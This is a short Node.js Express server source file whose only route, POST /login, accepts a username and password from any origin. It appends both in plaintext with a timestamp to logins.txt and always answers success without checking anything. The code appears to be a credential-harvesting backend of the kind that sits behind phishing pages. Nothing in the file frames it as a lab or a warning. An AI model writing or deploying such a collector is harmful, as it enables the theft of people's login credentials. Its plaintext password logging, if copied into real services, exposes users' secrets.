const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const logEntry = `Username: ${username}, Password: ${password}, Time: ${new Date().toISOString()}\n`;
    // Append the login info to a file called logins.txt
    fs.appendFile('logins.txt', logEntry, (err) => {
        if (err) {
            console.error('Error writing to file', err);
        }
    });
    res.json({ success: true, message: 'Received!' });
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});